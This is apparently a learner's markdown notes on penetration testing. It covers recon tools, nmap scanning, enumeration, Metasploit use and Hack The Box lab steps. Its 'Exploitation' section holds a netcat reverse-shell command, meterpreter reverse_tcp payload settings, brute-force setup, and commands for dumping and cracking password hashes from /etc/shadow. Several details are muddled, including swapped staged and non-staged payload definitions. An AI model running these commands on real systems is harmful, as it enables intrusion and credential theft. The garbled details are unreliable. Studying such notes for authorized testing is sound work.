# Penetration Testing /Ethical Hacking



## Pentesting Tools and Softwares


 **Engagement**
- It is the act of hacking into a company's netework after obtaining permission. It has 5 stages

1. Planning and Reconnaissance /information gathering
2. Scanning
3. Exploitation
4. Post Exploitation
5. Reporting


## Planning and prep for attack


- **Types of Pen Testing**

1. `No view` or `black box` hacking into a company's network by using public internet only tools - detects exposed and visible vulnerability

2. `full view` The company gives full knowlege of the network 

3. `partial view` or `grey box`  testing in house system of network administrator

- **Attack Prep or Reconnaissance**

It can be active (directly engaging with the target system) or passive (Gaining information w/o actively engaging with the system) 

## Common tasks of a pentester

- External/Internal Network
- Web Application
- Wireless - Evaluation of the wireless network
- Physical (Go on site and try to break into the building)/Social/Phishing
- SOC("Purple Teaming") Attacker is read, defender- Its red team vs blue team- called purple teaming assessments- The cat an mouse game
- Report writing

## Useful softwares
 - KeepNote to take notes
 - Green shot or flame shot
 - cherry tree

 ## Networking background

- `ipconfig` for windows `ifconfig`
- NAT
- Media access control (MAC) is the physical address of a device and is in layer 2/ and with switches. 
- The IP addresses are in layer 3. Anythig using a network interface will have a MAC address

## Installations

- Kali linux : 
- VM ware for windows
- 7 zip

- configure virtual machine- VM ware, assign 4GB ram and then select NAT as the network adapter

shortcuts, double tab, ~/
    `ls -la` will reveal hidden folders
    `ls -la` /tmp/  for checking the permissions of the file inside the temp folder
    `chmod 777 filename.txt` or chmod +x filename.txt giving full read wrtie access
- `cat /etc/passwd`
to change password I can type passwd in the terminal
adding a user to sudoers

    `ifconfig` linux
    `iwconfig`  wireless
    `ipconfig`  windows

- Network commands
   ` ping`
   ` arp -a` associating the ip addresses with mac addresses
`netstat -ano` list all the active connections running on the machine- Is the machine talking to someone else and which ports
- route tells were the traffic exit
ifconfig alternative is ip:
- `ip a`
- `ip n`
- `ipr`

- Updating softwares
-   apt update && apt upgrade
-  ` apt install python3-pip`

- install pimp upgrate from cloning a github repository in the 
- cd /opt
- git clone https://github.com/Dewalt-arch/pimpmykali.git
- ./pimpmykali.sh

if gedit gives an error then use.
`xhost local:` or `xhost +SI:localuser:root` , the later only fixes the issue for a root user

`ping 192.168.13.2 -c 1 > ip.txt ` - pings one time and then stores in a file
`cat ip.txt | grep "64 bytes"` - This will tell me that the data is being able to be received after ping- so those ip addresses maybe active or accible. 
`cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"` here tr trauncates at the level of first :, d is delimiter whch in this case is the space and then we are selecting the 4th time his delimiter is used


## Phyton3

```python


```
## Information gathering

`www.bugcrowd.com` - finding websites to hack who would pay you
`hunter.io` gives insights regarding the email password
Heath adams searching the company for datadump from dark web of usernames
`The harvester` - its built into the Kali linux - It searches information in google
`sublist3r` app that can be installed: Aids with Searching the subdomains: It is similar to the harvester, but more comprehensive and it is not a built in program. It has to be harvested, for example if i type `sublist3r -d tesla.com -t 100` threadng
Certificate fingerprinting - This also provides information regaring the domains- It can also provide information regaring the sub-sub-domains
`owasp amass` - can be downloaded using a github repository
tomnomnom httpprobe
`biltwith.com` info regarding the web technoligies related to the website 
`wapalyzer` very neat tool gives a nice overview about a website
`whatweb` - built in Kali linux tools. www.tesla.com
`Burp suite` - has capability of intercepting web traffic, checkout anoher similar tool `foxy proxy`, we can change the request parameters and then examin the response
goole fu, `site:tesla.com -www filetype:pdf`
Utilizing social media

## Scanning and enumeration

www.vulnhub.com. VULNHUB - you can download a vulnerable virtual machine and then load it into VMware and then practice attacking - has various levels of vulnerable machines
kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
- Finding actively running machines and their ip addresses. `ifconfig`  then `netdiscover -r <ip address with subnet>`
`SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection, but then not establishing one. 
- Modification: SYN SYNACK RST - this specification is a trick to reveal port, but not establishing a connection. 
`nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example -p 80,443. -A tell me everything (OS detection, version detection, script scanning and trace route). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
    Note that -A is the real speed killer here as it is checking for all the versions
`nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
nmap can be used for script scaning, OS detection - other options: version detection, script scanning and trace route if I select -A - it will do all these functions, but is slow. We can also specify the ports. 
- We want to look at what ports are open and whats running on these open ports

**Other methods of scanning**
- One method is shown above
- massscan
- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1-65535 <ip address>`

- **Things to look for when you have run the scan**
- Look for open ports
- anonymous FTP allowed?
- versions for exploitation such as SAMBA - SMB is a network protocol that lets remote computers to connect with servers
- If SSH is open then if you attack it then the company should be able to detect it, attacking SSH makes you noisy. If the blue team of the company is unable to detect then their defences are likely very weak
- OS guesses, may not be accurate initially- you can confirm this after you are able to gain access
- There can be some default webpages for sub-domins- these indicate an opening for a hidden directory maybe for a sub-domain that could be exploited with `drbuster`, `gobuster` etc

**Drbuster**
- `http://<ipaddress>:80`, then you supply the wordlist. You are trying to brute force the directories. Then you specify extensions like (asm, asmx, asp, aspx, txt, zip, rar, php-if apache webserver)

**After inspecting the scan findings**

- **Enumerating ports**
- Can start with investigating on ports 80, 443, 139 or the ones that are open
- A tool nikto - It is a web vulnerability scanner - It can also backfire sometimes because if the company's website uses advance security features, it can autoblock
- `nikto -h http://192.168.57.134`. When this scan is run, it will list out a bunch of vulnerabilities. Save the scan findings into a text file
- `dirbuster, gobuster` - this has a list of directories and will scan to detect them. Some of these softwares are built in Kali linux. It can also scan the files. I can use this in conjunction with` burp suite` to intercept traffic. We are looking for what services are being run and what are the versions of the softwares installed. 

Response codes: `200` ok, `400` error, `500` server error, `300` is redirect

- SMB. SMB is a file share. Manages uploading, DL files or sharing files with co-workers. It is important to know what type of SMB version is being used
- **Metasploit**- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
   ` Rhosts `- target address, `set RHOSTS 192.168.57.139`and then `run` This refers fo remote hosts, hosts are the individual machines in the network
    `Lhosts` - this is the listening host
- **Smbclient** - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal

- connecting to ssh `ssh <ipaddress>` -oKexAlgorithms. We will attempt to connect- goal is to see if there is a banner that can have some information

- Once you identify the vulnerabilities then these can be exploited by searching in google. Basically what you will find is the code on the web that is written to exploit a particular vulnerability

- Another terminal command `searchsploit` What this does is search for the scripts and then downloads. It should not be very specific. This is an additional tool in addition to google- tells about what exploits are available for a given version of OS. For example if I run an nmap scan. It will give me some information about what versions of the software are available on the internet and then I can use type `searchsploit apache 2.18` for example and it will list out all the exploits that are available. 




## Exploitation

- **Metasploit COmmands**
- `msfconsole`
- `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
- `sysinfo` This will tell us about the system that we have hacked into
- `systemctl postgresql enable` This will have postgresql running which metasploit needs to run, Even if I do not do it it is fine, as the program will load it anyway, but will be faster otherwise if I do. 

- Typically after running the `nmap` scan you will have info regarding the version of filesystem such as samba- then you google for that version to find code for exploitation. 
- Then you paste that code into metasploit command terminal
- you can then type `options`
- `set rhosts <ip address of victim>`
- `show targets`
- `run`

- Once you are able to connect. The next step is sending the malware script 


- `set payload windows/x64/meterpreter` see if the options for the staged show up. The goal is to just try an alternative with staged approach if the non-staged approach does not work
- `set payload windows/x64/meterpreter/reverse_tcp` - Note that this is at the exploit level and before you have established the connection

- eternal blue was one of the exploites for the microsoft SMBA version that was exploited by **wannacry** It was developed by NSA. The exploit python code can be found at github (MS17-010-eternal blue)
- msfvenom is another type of payload that can exploit the ftp


- Then once you have gained access, you can type `whoami` or `getuid` to see if you got root access "NT authority/system" is usually root access, then you can explore further with:
    `ls`, `pwd`, `updatedb`, ` locate root.txt`, `locate user.txt`, `cat etc/passwd`, `cat etc/shadow`, `gedit passwd`, `gedit shadow` to copy the contents of your file into text files so you can **unshadow** them using `unshadow passwd shadow` these are the names of the files as you saved using gedit
- What this does is replaces the 'x' in the passwd file with the hash and then you can crack the hashes using **hashcat**
- You can also use `hashdump` after gaining access. What this does is, it will take all the hashes in the accounts on the machine that was exploited with metasploit and then dumps itinto the terminal for you to see and use
- `ftp <ipaddress>` I can attempt connecting to the file server and obtain access to files
- Other commands `shell`, `route print`, `arp -a`, `netstat -ano` these provide additional infromation regarding active connections and ports. `load incognito`

- There are a bunch of commands that we can run with metasploit like after typing gaining access with metasploit I can type 'help" and under the networking section there will be commands that you can run. 


- Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
- Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
- Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
- poping a shell means gaining access to a machine

**Reverse Shell**
-`nc -nvlp 444` attack box (lvp means listening verbose port)
-`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
- Whenever a victim connects back to 

**Bin shell**
- You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat

**Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
- Windows type
- Linux type
- Meterpreter
- python

- It is important to know the staged vs non-staged. If one does not work, try the other
- **Staged**- sends all shellcode at once- might not always work `windows/meterpreter_reverse_tcp`
- **Non-staged**- sends the code in stages, is less stable `windows/meterpreter/reverse_tcp

- we can use metasploit or also send exploits manually. One option is openfuck https://github.com/heltonWernik/OpenLuck

**Brute force attack**
- using metasploit : `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt` and then `set rhosts <ip address>` - this is for setting up rhost we can also `set threads 10` `set verbose true` 
- One purpose of a brute force attack is to determine whether the blue team at 

**Credential stuffing**

- foxy proxy - install to firefox


## Hack the box

General steps:

- Run   `nmap` scan. It can give some estimate of what type of machine are we after, windows/linux and what type of servers maybe running apache. 
- Then you can run `searchsploit` based on the versions that you learnt about
- type the ip of the victim in the terminal to see if there is a webpage available externally, if there is then it maybe an opening for `drbuster` you can analyze this webpage with a `wapalyzer` and review the source code. There might be hidden comments in the source code. 
- Then you can repeat `searchsploit` again if there is any extra information you found from reading the source code
- If you find exploits available. If its a .rb file then it suggests that there is likely a metasploitmodule available. The initial goal is to obtain a reverse powershell- any exploit module that allows remote code execution is money. 
- You can also lookout for any exploit module that can let you upload a file. That way you can upload a file with malacious code that can help you gain access to powershell. For example the code can open a port and then you can tell it to connect to an ip address which is the ip address of your hacking machine and at the same time you can open a listening port on your hacking machine and that way you can connect via a reverse powershell fashion.
- Once you are in then you can run metasploit `msfconsole` for hashdup and do all kinds of things
- It also tells you the limitations of the exploits. For example, it may require authenticated access- then we might have to crack the admin account. Once you figure out the password then you can run the following commands in metasploit.

- `set password <password>` you are telling metasploit what password to use during the exploit if the exploite will depend on authenticated access and you have already figured out the usernam and password
- `set username <admin>` you are specifying what username to use
- `set rhosts <ip address>`
- `set targeturi </nibbleblog>` this is the path to the 'directory page' where you can run the exploit. For instance <ip address>/<admin page> as in www.goolge.com/admin
- `options` This will show the targets

- Note that once you gain access then you should thoroughly explore the webpage- especially look for openings where a file maybe uploaded
- Once you get shell access. you can type `sysinfo`. Look for OS vrsion esp for privilige escalation purposes. `geuid` will tell you what level of user access do you have. 
- Then you can type `shell` to get into the terminal on that host and then type `pwd` to locate where you are at
- Then you can type `whoami` it will tell you the user name then type `cd /home` and then `cd <username>` to get into the user dierectory. Then `ls -la`
- Then you can type `cat user.txt` and `history` to look at all the commands the user has typed




- **Machine Legacy**

- `nmap -T4 -p- -A <ipaddress>`
    Gives back open ports - basically file sharing, OS version, hostname, Mac address,  smb_version?
- `search smb_version`